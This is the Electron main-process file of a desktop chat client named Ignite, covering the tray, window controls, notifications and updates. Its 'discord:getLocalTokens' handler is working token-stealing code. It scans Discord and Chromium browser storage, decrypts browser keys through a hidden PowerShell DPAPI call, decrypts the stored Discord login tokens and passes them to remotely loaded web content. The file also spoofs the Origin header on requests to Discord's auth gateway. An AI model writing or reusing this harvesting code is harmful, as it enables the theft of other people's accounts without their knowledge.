const { app, autoUpdater, BrowserWindow, ipcMain, Tray, desktopCapturer, Menu, shell, nativeImage, Notification } = require('electron');
const { join } = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { execFile } = require('child_process');

let tray = null;
let mainWindow = null;

const createTray = () => {
  let iconPath = join(__dirname, 'tray-icon.ico');

  if (process.platform === 'darwin') {
    tray = new Tray(nativeImage.createEmpty());
  } else {
    tray = new Tray(iconPath);
  }

  const contextMenu = Menu.buildFromTemplate([
    {
      label: 'Show Ignite',
      click: () => {
        if (mainWindow) {
          mainWindow.show();
        }
      }
    },
    {
      label: 'Quit',
      click: () => {
        app.isQuitting = true;
        app.quit();
      }
    }
  ]);

  tray.setToolTip('Ignite');
  tray.setContextMenu(contextMenu);

  // Show window on tray icon click
  tray.on('click', () => {
    if (mainWindow) {
      mainWindow.show();
    }
  });
};

const startCore = () => {
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    center: true,
    titleBarStyle: 'hidden',
    backgroundColor: '#2f3136',
    webPreferences: {
      preload: join(__dirname, "preload.js"),
      contextIsolation: true,
      nodeIntegration: false,
    },
  });

  // Minimize to tray instead of closing
  mainWindow.on('close', (event) => {
    if (!app.isQuitting) {
      event.preventDefault();
      mainWindow.hide();
    }
  });

  const isDev = !app.isPackaged;
  mainWindow.loadURL(isDev ? "http://localhost:5173" : "https://app.ignite-chat.com");

  // Rewrite Origin header for Discord remote auth gateway (requires https://discord.com)
  mainWindow.webContents.session.webRequest.onBeforeSendHeaders(
    { urls: ['wss://remote-auth-gateway.discord.gg/*'] },
    (details, callback) => {
      details.requestHeaders['Origin'] = 'https://discord.com';
      callback({ requestHeaders: details.requestHeaders });
    }
  );

  if (isDev) {
  //  mainWindow.webContents.openDevTools();
  }

  // Setup IPC handlers for window controls
  ipcMain.handle('window:minimize', () => {
    if (mainWindow) {
      mainWindow.minimize();
    }
  });

  ipcMain.handle('window:maximize', () => {
    if (mainWindow) {
      if (mainWindow.isMaximized()) {
        mainWindow.unmaximize();
      } else {
        mainWindow.maximize();
      }
    }
  });

  ipcMain.handle('window:close', () => {
    if (mainWindow) {
      mainWindow.close(); // This will trigger the 'close' event and hide the window
    }
  });

  ipcMain.handle('shell:openExternal', async (_event, url) => {
    if (typeof url === 'string' && (url.startsWith('https://') || url.startsWith('http://'))) {
      await shell.openExternal(url);
    }
  });

  // Badge overlay for taskbar unread indicators
  // count 1-10 = mention count badge, 11 = unread but no mentions, 0/null = clear
  ipcMain.handle('badge:set', (_event, count) => {
    console.log('[Badge] badge:set called with count:', count);
    if (!mainWindow) {
      console.log('[Badge] No mainWindow, skipping');
      return;
    }

    if (!count || count <= 0) {
      console.log('[Badge] Clearing overlay icon');
      mainWindow.setOverlayIcon(null, '');
      return;
    }

    const badgeNum = Math.min(count, 11);
    const badgePath = join(__dirname, 'assets', 'badges', `badge-${badgeNum}.ico`);
    console.log('[Badge] Loading badge icon:', badgePath);

    if (fs.existsSync(badgePath)) {
      const icon = nativeImage.createFromPath(badgePath);
      const description = badgeNum === 11 ? 'Unread messages' : `${badgeNum} mention${badgeNum > 1 ? 's' : ''}`;
      console.log('[Badge] Setting overlay icon:', description);
      mainWindow.setOverlayIcon(icon, description);
    } else {
      console.log('[Badge] Badge icon not found at:', badgePath);
    }
  });

  ipcMain.handle('notification:show', (_event, { title, body }) => {
    const notification = new Notification({
      title: title || 'Ignite',
      body: body || '',
      silent: true,
    });

    notification.on('click', () => {
      if (mainWindow) {
        mainWindow.show();
        mainWindow.focus();
      }
    });

    notification.show();
  });

  // Scan Discord variants and browsers for Discord tokens (Windows only)
  ipcMain.handle('discord:getLocalTokens', async () => {
    if (process.platform !== 'win32') return [];

    const appdata = process.env.APPDATA;
    const localAppdata = process.env.LOCALAPPDATA;
    if (!appdata || !localAppdata) return [];

    const sources = [
      // Discord variants
      { name: 'Discord', leveldb: join(appdata, 'discord', 'Local Storage', 'leveldb'), localState: join(appdata, 'discord', 'Local State') },
      { name: 'Discord Canary', leveldb: join(appdata, 'discordcanary', 'Local Storage', 'leveldb'), localState: join(appdata, 'discordcanary', 'Local State') },
      { name: 'Discord PTB', leveldb: join(appdata, 'discordptb', 'Local Storage', 'leveldb'), localState: join(appdata, 'discordptb', 'Local State') },
      // Chromium browsers
      { name: 'Chrome', leveldb: join(localAppdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'), localState: join(localAppdata, 'Google', 'Chrome', 'User Data', 'Local State') },
      { name: 'Edge', leveldb: join(localAppdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'), localState: join(localAppdata, 'Microsoft', 'Edge', 'User Data', 'Local State') },
      { name: 'Brave', leveldb: join(localAppdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'), localState: join(localAppdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State') },
      { name: 'Opera', leveldb: join(appdata, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'), localState: join(appdata, 'Opera Software', 'Opera Stable', 'Local State') },
      { name: 'Opera GX', leveldb: join(appdata, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'), localState: join(appdata, 'Opera Software', 'Opera GX Stable', 'Local State') },
      { name: 'Vivaldi', leveldb: join(localAppdata, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'), localState: join(localAppdata, 'Vivaldi', 'User Data', 'Local State') },
    ];

    const fsp = fs.promises;

    // 1. Filter to sources that actually exist on disk (parallel, lightweight)
    const existingSources = (
      await Promise.all(
        sources.map(async (source) => {
          try { await fsp.access(source.leveldb); return source; } catch { return null; }
        }),
      )
    ).filter(Boolean);

    if (existingSources.length === 0) return [];

    // 2. Read Local State files and collect encrypted keys (no PS yet)
    const keysToDecrypt = []; // { localStatePath, b64Key }
    const keyIndexByPath = new Map(); // localStatePath -> index in keysToDecrypt
    for (const source of existingSources) {
      if (keyIndexByPath.has(source.localState)) continue;
      try {
        const raw = await fsp.readFile(source.localState, 'utf-8');
        const localState = JSON.parse(raw);
        const encryptedKeyB64 = localState?.os_crypt?.encrypted_key;
        if (encryptedKeyB64) {
          const encryptedKey = Buffer.from(encryptedKeyB64, 'base64').slice(5);
          keyIndexByPath.set(source.localState, keysToDecrypt.length);
          keysToDecrypt.push({ path: source.localState, b64Key: encryptedKey.toString('base64') });
        }
      } catch (_) {}
    }

    // 3. Single PowerShell call to decrypt ALL keys at once
    const decryptedKeys = new Map(); // localStatePath -> Buffer
    if (keysToDecrypt.length > 0) {
      const psLines = keysToDecrypt.map((k) =>
        `try { [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('${k.b64Key}'), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)) } catch { Write-Output 'FAIL' }`,
      );
      const psScript = `Add-Type -AssemblyName System.Security\n${psLines.join('\n')}`;
      try {
        const stdout = await new Promise((resolve, reject) => {
          execFile('powershell', ['-Command', psScript], { timeout: 10000, windowsHide: true }, (err, out) => {
            if (err) reject(err);
            else resolve(out.trim());
          });
        });
        const lines = stdout.split(/\r?\n/);
        keysToDecrypt.forEach((k, i) => {
          if (lines[i] && lines[i].trim() !== 'FAIL') {
            decryptedKeys.set(k.path, Buffer.from(lines[i].trim(), 'base64'));
          }
        });
      } catch (_) {}
    }

    // 4. Read LevelDB files in parallel (lightweight I/O, no more PS)
    function extractTokensFromContent(content, encryptionKey) {
      const tokens = [];
      if (encryptionKey) {
        const encryptedMatches = content.match(/dQw4w9WgXcQ:[^\s"',;}{[\]]+/g);
        if (encryptedMatches) {
          for (const match of encryptedMatches) {
            try {
              const encrypted = Buffer.from(match.split('dQw4w9WgXcQ:')[1], 'base64');
              const nonce = encrypted.slice(3, 15);
              const ciphertext = encrypted.slice(15, -16);
              const tag = encrypted.slice(-16);
              const decipher = crypto.createDecipheriv('aes-256-gcm', encryptionKey, nonce);
              decipher.setAuthTag(tag);
              const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
              const token = decrypted.toString('utf-8');
              if (token && token.length > 20) tokens.push(token);
            } catch (_) {}
          }
        }
      }
      const plainMatches = content.match(/[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}/g);
      if (plainMatches) tokens.push(...plainMatches);
      return tokens;
    }

    const results = await Promise.all(
      existingSources.map(async (source) => {
        try {
          const encryptionKey = decryptedKeys.get(source.localState) || null;
          const allFiles = await fsp.readdir(source.leveldb);
          const files = allFiles.filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
          const tokens = [];
          for (const file of files) {
            const content = await fsp.readFile(join(source.leveldb, file), 'utf-8');
            tokens.push(...extractTokensFromContent(content, encryptionKey));
          }
          return tokens.map((token) => ({ source: source.name, token }));
        } catch (_) {
          return [];
        }
      }),
    );

    return results.flat();
  });

  ipcMain.handle('desktop:getSources', async () => {
    const sources = await desktopCapturer.getSources({
      types: ['window', 'screen'],
      thumbnailSize: { width: 320, height: 180 },
      fetchWindowIcons: true,
    });

    return sources.map((source) => ({
      id: source.id,
      name: source.name,
      thumbnailDataUrl: source.thumbnail.toDataURL(),
      appIconDataUrl: source.appIcon ? source.appIcon.toDataURL() : null,
    }));
  });
};

const checkForUpdates = () => {
  return new Promise((resolve) => {
    // Built-in autoUpdater uses Squirrel and only supports Windows and macOS
    if (process.platform === 'linux') return resolve(false);

    const version = require('./package.json').version;
    const feedURL = `https://api.ignite-chat.com/download/updates/${process.platform}/${version}`;

    try {
      autoUpdater.setFeedURL({ url: feedURL });

      autoUpdater.on('error', (err) => {
        console.error('AutoUpdater error:', err.message);
        resolve(false);
      });

      autoUpdater.on('update-not-available', () => {
        console.log('AutoUpdater: App is up to date');
        resolve(false);
      });

      autoUpdater.on('update-downloaded', (_event, releaseNotes, releaseName) => {
        console.log('AutoUpdater: Update downloaded:', releaseName);
        autoUpdater.quitAndInstall();
      });

      autoUpdater.checkForUpdates();
    } catch (e) {
      console.error('AutoUpdater setup failed:', e);
      resolve(false);
    }
  });
};

const startUpdate = async () => {
  if (app.isPackaged) {
    const updated = await checkForUpdates();
    if (updated) return; // quitAndInstall was called
  }

  startCore();
};


module.exports = () => {
  app.setAppUserModelId('Ignite');

  app.whenReady().then(() => {
    createTray();
    startUpdate();

    app.on("activate", () => {
      if (BrowserWindow.getAllWindows().length === 0) startUpdate();
    });
  });

  app.on("window-all-closed", (event) => {
    // Prevent quit when all windows are closed, keep app in tray
    event.preventDefault();
  });
};
